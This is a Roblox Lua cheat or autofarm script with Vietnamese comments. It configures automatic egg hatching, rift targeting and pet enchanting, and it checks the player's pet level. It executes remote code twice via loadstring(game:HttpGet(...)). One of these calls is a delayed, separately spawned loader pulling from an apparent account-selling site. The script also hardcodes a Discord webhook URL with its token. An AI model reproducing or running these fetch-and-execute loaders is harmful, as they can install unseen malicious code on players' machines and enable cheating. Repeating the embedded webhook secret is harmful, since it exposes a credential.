if not game:IsLoaded() then
    game.Loaded:Wait()
  end



task.spawn(function()
wait(10)

loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2Fextrabsi.txt"))()

end)

getgenv().Settings = {
    ["Egg Settings"] = {
        OpenEggs = true,
        Egg = "Pastel Egg",
        --// Supports ANY egg ("Rainbow Egg", "Infinity Egg", ...). Keep "Best" for new accounts.
        
        ["Notifications"] = {
            Webhook = "https://discord.com/api/webhooks/1280307675636301948/sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD",
            DiscordID = "1070055033225347212",
            Difficulty = "2m", --// Minimum Difficulty for Webhook Notifications
        },

        ["Rifts"] = {
            FindRifts = true,
            SortByMultiplier = false, 
            --// true --> Sort by Multiplier out of ALL Targetted Rifts.
            --// false --> Sort by Multiplier out of BEST Targetted Rifts.
            
            Targets = {"Aura Egg", "Bunny Egg", "Pastel Egg", "Nightmare Egg"},
            --// Targets = {} will automatically find the Top 3 BEST Rifts to hatch.
        },
    },
    
	["Enchant Settings"] = {
    EnchantPets = false,

    ["Require All Enchants"] = false,
    ["Enchants Needed"] = {
        ["Team Up"] = {Tier = 1, HigherTiers = true},
    },
	},
	
    ["Debug"] = {
        DisableUI = false,
    },
}

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Hàm lấy nhãn Level cho Pets
local function getLevelLabel()
    local success, result = pcall(function()
        return player
            :WaitForChild("PlayerGui")
            :WaitForChild("ScreenGui")
            :WaitForChild("Mastery")
            :WaitForChild("Container")
            :WaitForChild("Left")
            :WaitForChild("ScrollingFrame")
            :WaitForChild("Pets")
            :WaitForChild("Button")
            :WaitForChild("Level")
    end)
    if not success then
        warn("Failed to find Level label for Pets: " .. result)
        return nil
    end
    return result
end

-- Hàm lấy cấp độ hiện tại cho Pets
local function getCurrentLevel()
    local levelLabel = getLevelLabel()
    if not levelLabel then
        return nil
    end
    local levelText = levelLabel.Text
    local levelNumber = tonumber(string.match(levelText, "%d+"))
    if not levelNumber then
        warn("Could not parse level number for Pets from text: " .. levelText)
        return nil
    end
    return levelNumber
end

-- Kiểm tra cấp độ Pets và cập nhật FindRifts
local petsLevel = getCurrentLevel()
if not petsLevel then
    warn("Could not retrieve Pets level, keeping FindRifts unchanged.")
else
    if petsLevel >= 15 then
        Settings["Egg Settings"].Rifts.FindRifts = true
		Settings["Egg Settings"].Egg = "Pastel Egg"
        print("Pets Level: " .. petsLevel .. " (>= 15), set FindRifts to true")
    else
        Settings["Egg Settings"].Rifts.FindRifts = false
		Settings["Egg Settings"].Egg = "Nightmare Egg"
        print("Pets Level: " .. petsLevel .. " (< 15), set FindRifts to false")
    end
end



loadstring(game:HttpGet("https://system-exodus.com/scripts/BGSI/OneClick.lua"))()
